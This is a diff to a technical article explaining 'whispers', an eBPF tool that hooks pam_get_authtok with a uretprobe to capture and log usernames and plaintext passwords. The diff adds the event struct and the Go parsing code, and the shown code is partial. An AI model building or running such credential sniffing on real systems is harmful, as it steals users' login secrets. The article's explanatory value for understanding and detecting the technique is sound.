@@ -209,6 +209,13 @@ struct
   __uint(max_entries, 256 * 1024);
 } rb SEC(".maps");
 
+// and we will use this struct to store the items for our bpf map
+typedef struct _event_t {
+    int  pid;
+    char comm[16];
+    char username[80];
+    char password[80];
+} event_t;
 ...
 
 SEC("uretprobe/pam_get_authtok")
@@ -285,7 +292,7 @@ This article will only touch on the most interesting parts of the code. The sour
 
 We're using cilium ebpf to handle loading our BPF program and interacting with the BPF maps. In the following, `bpfObjects` and `loadBpfObjects` are defined in the auto-generated file `bpf_x86_bpfel.go`:
 
-```golang
+```go
 func Listen(ctx context.Context, cfg *config.Config) error {
     objs := bpfObjects{}
     if err := loadBpfObjects(&objs, nil); err != nil {
@@ -301,7 +308,7 @@ The above snippet demonstrates loading the eBPF program and ensuring it is corre
 
 whispers attaches uretprobes to target functions (e.g., pam\_get\_authtok) also using the cilium/ebpf library:
 
-```golang
+```go
 ex, err := link.OpenExecutable(cfg.BinPath)
 if err != nil {
     return err
@@ -314,9 +321,9 @@ defer up.Close()
 ...
 ```
 
-The Go code uses a ring buffer to read events captured by the eBPF program:
+The Go code reads from the BPF map (a ring buffer) to read events captured by the eBPF program:
 
-```golang
+```go
 rb, err := ringbuf.NewReader(objs.Rb)
 if err != nil {
     log.Printf("failed to open ring buffer reader: %v", err)
@@ -333,9 +340,49 @@ go func() {
 }()
 ```
 
+We'll need to handle reading the raw data from the BPF map and converting it into something we can easily interact with in Golang:
+
+```go
+...
+// this needs to perfectly match the structure of our BPF map items (defined in our .h file as _event_t)
+type eventT struct {
+	Pid      int32
+	Comm     [16]byte
+	Username [80]byte
+	Password [80]byte
+}
+...
+func byteArrayToString(b []byte) string {
+	n := -1
+	for i, v := range b {
+		if v == 0 {
+			n = i
+			break
+		}
+	}
+	if n == -1 {
+		n = len(b)
+	}
+	return string(b[:n])
+}
+
+func parseEventData(data []byte) *eventT {
+	var event eventT
+
+	if len(data) >= int(unsafe.Sizeof(eventT{})) {
+		if err := binary.Read(bytes.NewReader(data), binary.LittleEndian, &event); err == nil {
+			return &event
+		}
+	}
+
+	return nil
+}
+...
+```
+
 After reading events from the ring buffer, whispers processes and logs the captured credentials:
 
-```golang
+```go
 log.Printf("Event: PID: %d, Comm: %s, Username: %s, Password: %s",
     event.Pid,
     byteArrayToString(event.Comm[:]),
